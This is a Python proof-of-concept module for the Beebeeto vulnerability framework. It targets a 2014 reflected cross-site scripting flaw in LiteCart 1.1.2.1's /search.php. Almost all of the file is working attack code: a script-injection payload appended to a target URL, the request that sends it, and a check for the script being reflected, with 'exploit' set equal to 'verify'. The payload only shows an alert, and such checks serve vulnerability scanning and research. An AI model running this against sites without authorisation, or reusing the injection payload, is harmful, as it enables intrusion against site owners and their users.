#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import urllib2

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2014-0139',
            'name': 'LiteCart 1.1.2.1 /search.php 跨站脚本漏洞 POC',
            'author': 'foundu',
            'create_date': '2014-11-07',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'LiteCart',
            'vul_version': ['1.1.2.1'],
            'type': 'Cross Site Scripting',
            'tag': ['LiteCart漏洞', 'XSS漏洞', '/search.php', 'php'],
            'desc': '''
                    Several cross-site scripting vulnerabilities where discovered in LiteCart,
                    an open source project that allows you to create a e-commerce sites.
                    ''',
            'references': ['https://www.netsparker.com/xss-vulnerabilities-in-litecart/',
            ],
        },
    }


    @classmethod
    def verify(cls, args):
        payload = '''/search.php?query='"--></style></scRipt><scRipt>alert(0x0000C0)</scRipt>'''
        verify_url = args['options']['target'] + payload
        req = urllib2.Request(verify_url)
        if args['options']['verbose']:
            print '[*] Request URL: ' + verify_url
        content = urllib2.urlopen(req).read()
        if '<scRipt>alert(0x0000C0)</scRipt>' in content:
            args['success'] = True
            args['poc_ret']['vul_url'] = verify_url
        return args

    exploit = verify


if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())